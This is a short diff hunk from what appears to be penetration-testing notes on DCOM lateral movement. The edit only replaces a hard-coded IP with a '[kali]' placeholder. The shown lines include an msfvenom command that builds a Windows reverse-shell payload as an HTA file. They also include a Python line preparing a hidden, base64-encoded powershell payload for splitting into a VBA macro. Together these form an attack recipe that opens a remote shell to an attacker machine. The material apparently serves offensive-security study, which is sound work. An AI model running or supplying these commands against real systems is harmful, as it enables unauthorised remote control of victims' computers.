@@ -240,7 +240,7 @@ Distributed Component Object Model (DCOM)
 DCOM - create payload and VBA macro
 ```
 # (kali) create rshell payload
-$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+$ msfvenom -p windows/shell_reverse_tcp LHOST=[kali] LPORT=4444 -f hta-psh -o evil.hta
 
 # (python) split payload into smaller chunks starting with "powershell.exe -nop -w hidden -e
 str = "powershell.exe -nop -w hidden -e {base64_encoded_payload}"
